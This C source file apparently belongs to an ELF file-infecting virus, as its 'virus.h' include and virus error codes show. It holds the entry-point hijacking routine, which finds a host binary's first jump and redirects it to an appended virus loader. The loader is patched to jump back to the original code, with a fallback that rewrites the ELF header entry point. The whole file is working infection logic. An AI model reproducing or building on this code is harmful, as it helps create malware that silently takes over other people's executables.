#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "jumps.h"
#include "compiler_utils.h"
#include "errors.h"

/* -------------------------- change header entry --------------------------- */

static bool	change_header_entry(struct safe_ptr clone_ref,
			Elf64_Xword dist_payload_entry)
{
	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	Elf64_Addr	e_entry = hdr->e_entry;

	e_entry += dist_payload_entry;
	hdr->e_entry = e_entry;

	return true;
}

/* ---------------------- adapt client and loader code ---------------------- */

static void	write_jump_to_client(void *loader_jmpclient_ptr, void *client_jump_destination)
{
	int32_t	value = (int32_t)(client_jump_destination - (loader_jmpclient_ptr + JUMP32_INST_SIZE));

	write_jump(loader_jmpclient_ptr, value, DWORD);
}

static void	write_jump_to_virus(void *client_jump_ptr, const void *loader_entry_ptr)
{
	int32_t	value = (int32_t)(loader_entry_ptr - client_jump_ptr) - JUMP32_INST_SIZE;

	write_jump(client_jump_ptr, value, DWORD);
}

/* -------------------------------------------------------------------------- */

static bool	change_client_jump(struct safe_ptr clone_ref,
			size_t entry_offset, size_t payload_offset,
			size_t dist_jmpclient_loader)
{
	// find first client jmp
	void	*client_first_jump = find_first_jump(clone_ref, entry_offset);

	if (client_first_jump == NULL)
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	// get pointers
	size_t	loader_jump_offset = payload_offset + dist_jmpclient_loader;

	const void	*loader_entry_ptr = safe(clone_ref, payload_offset, 0);
	void		*loader_jmpclient_ptr = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);

	if (!loader_jmpclient_ptr || !loader_entry_ptr)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);

	// modify jump
	void	*client_jump_dst = get_jump_destination(client_first_jump);

	write_jump_to_client(loader_jmpclient_ptr, client_jump_dst);
	write_jump_to_virus(client_first_jump, loader_entry_ptr);

	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
		size_t dist_jmpclient_loader)
{
	Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
	size_t		offset_in_section  = file_entry->offset_in_section;
	size_t		entry_offset       = sh_offset + offset_in_section;
	size_t		payload_offset     = file_entry->end_of_last_section;
	Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;

	if (!change_client_jump(clone_ref, entry_offset, payload_offset, dist_jmpclient_loader))
		change_header_entry(clone_ref, dist_payload_entry);

	return true;
}
